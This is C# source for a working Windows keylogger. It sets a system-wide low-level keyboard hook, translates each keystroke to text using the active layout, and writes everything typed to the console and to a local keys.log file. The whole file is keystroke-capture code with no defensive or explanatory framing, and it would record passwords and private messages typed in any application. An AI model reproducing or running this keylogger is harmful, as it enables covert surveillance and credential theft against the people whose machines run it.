using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Text;
using System.Collections.Generic;
using System.Linq;

namespace KeyLog
{
    class Program
    {
        // special values
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;

        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        // const for logging keys
        private const string logFile = ".\\keys.log";
        private static System.IO.StreamWriter streamWriter;

        // keys that if found in the sequence tell that it’s not a character (except for AltGr)
        private static List<Keys> bypassKeys = new List<Keys>() {
            Keys.LControlKey,
            Keys.RControlKey,
            Keys.LMenu,
            Keys.RMenu,
            Keys.F1,
            Keys.F2,
            Keys.F3,
            Keys.F4,
            Keys.F5,
            Keys.F6,
            Keys.F7,
            Keys.F8,
            Keys.F9,
            Keys.F10,
            Keys.F11,
            Keys.F12,
            Keys.Escape,
            Keys.Back,
            Keys.Tab,
            Keys.Up,
            Keys.Down,
            Keys.Left,
            Keys.Right,
            Keys.LWin,
            Keys.RWin,
            Keys.Home,
            Keys.End
        };

        public static void Main()
        {
            streamWriter = new System.IO.StreamWriter(logFile, true);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // used to store key sequences
        private static List<Keys> buffer = new List<Keys>();

        // main method called every time a key is pressed or released
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            KeysConverter kc = new KeysConverter();
            CultureInfo culture = new CultureInfo("fr-FR");
            // getting all the key pressed in a sequence
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                buffer.Add((Keys)vkCode);
            }
            // we wait for the release before storing
            if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP)
            {
                // not in use, but allow to distinguish between regular/shifted char, and special keys/shortcuts (Backspace, Ctrl + S, F1...)
                bool isShortcut = false;
                string seq = KeyCodeToUnicode(buffer, out isShortcut);
                buffer.Clear();
                // write down the character
                Console.Write(seq);
                streamWriter.WriteLine(seq);
                streamWriter.Flush();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // convert a sequence of keys to a character according to the layout used
        public static string KeyCodeToUnicode(List<Keys> buffer, out bool isShortcut)
        {
            isShortcut = false;
            if (buffer.Count == 0)
            {
                return "";
            }
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus = GetKeyboardState(keyboardState);

            if (!keyboardStateStatus)
            {
                return "";
            }
            // reinit keyboard state
            keyboardState[VK_CONTROL] = GetKeyState(VK_CONTROL);
            keyboardState[VK_SHIFT] = GetKeyState(VK_SHIFT);
            keyboardState[VK_MENU] = GetKeyState(VK_MENU);
            Keys myKey = buffer.Last();

            uint virtualKeyCode = (uint)myKey;
            uint scanCode = MapVirtualKey(virtualKeyCode, 2);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

            StringBuilder result = new StringBuilder();
            // AltGr is no shortcut
            if (!(buffer.Contains(Keys.LControlKey) && buffer.Contains(Keys.RMenu)) && buffer.Any(x => bypassKeys.Contains(x)))
            {
                //this is a shortcut or a special key   
                var hashSet = new HashSet<Keys>(buffer);
                // lst used to have a trailing space, so the following line should not differ from the previous output
                result.Append(string.Concat(hashSet.Select(x => $"{x} ")));
                // but this one would:
                // result.Append(string.Join(" ", hashSet));
                isShortcut = true;
            }
            else
            {
                // we convert the code to the char depending on the keyboard layout used
                int ret = ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);
            }
            return result.ToString();
        }
        
        #region user.dll import
        [DllImport("user32.dll")]
        public static extern byte GetKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        #endregion

    }
}
